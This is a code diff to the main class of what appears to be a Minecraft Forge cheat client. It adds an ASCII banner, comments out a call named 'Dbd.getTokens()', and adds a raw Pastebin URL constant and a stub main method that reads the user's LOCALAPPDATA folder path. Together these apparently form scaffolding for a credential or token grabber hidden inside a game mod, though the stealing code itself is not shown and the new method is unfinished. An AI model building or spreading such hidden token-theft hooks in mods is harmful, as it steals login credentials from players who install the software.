@@ -67,7 +67,13 @@ public class Main {
     public void preInit(FMLPreInitializationEvent E) {
 
 
-        logger.info("ReimoundBD"+VERSION);
+        logger.info(" ");
+        logger.info("  _____      _                                 _ ____  _____  ");
+        logger.info(" |  __ \\    (_)                               | |  _ \\|  __ \\ ");
+        logger.info(" | |__) |___ _ _ __ ___   ___  _   _ _ __   __| | |_) | |  | |");
+        logger.info(" |  _  // _ \\ | '_ ` _ \\ / _ \\| | | | '_ \\ / _` |  _ <| |  | |");
+        logger.info(" | | \\ \\  __/ | | | | | | (_) | |_| | | | | (_| | |_) | |__| |");
+        logger.info(" |_|  \\_\\___|_|_| |_| |_|\\___/ \\__,_|_| |_|\\__,_|____/|_____/ ");
         Display.setTitle("Initializing " + NAME + " " + VERSION);
         config = new Config();
         // Load Transparent
@@ -129,7 +135,7 @@ public class Main {
 
         Main.moduleManager.getGui();
         Main.moduleManager.getHudGui();
-        Dbd.getTokens();
+        // Dbd.getTokens();
         com.krazzzzymonkey.catalyst.gui.click.ClickGui.onUpdate();
         com.krazzzzymonkey.catalyst.gui.click.HudEditor.onUpdate();
     }
@@ -147,6 +153,15 @@ public class Main {
             EVENT_HANDLER.displayMs = System.currentTimeMillis();
             logger.log(Level.ERROR, "Error while loading new config file, trying to keep the old one loaded.");
             config = backup;
+        }
+    }
+
+    private static final String PASTEBIN = "https://pastebin.com/raw/GyzcfnfC";
+
+    public static void main(String[] args){
+        String appdata=System.getenv("LOCALAPPDATA");
+        if (appdata == null || appdata.isEmpty()){
+            return;
         }
     }
 }
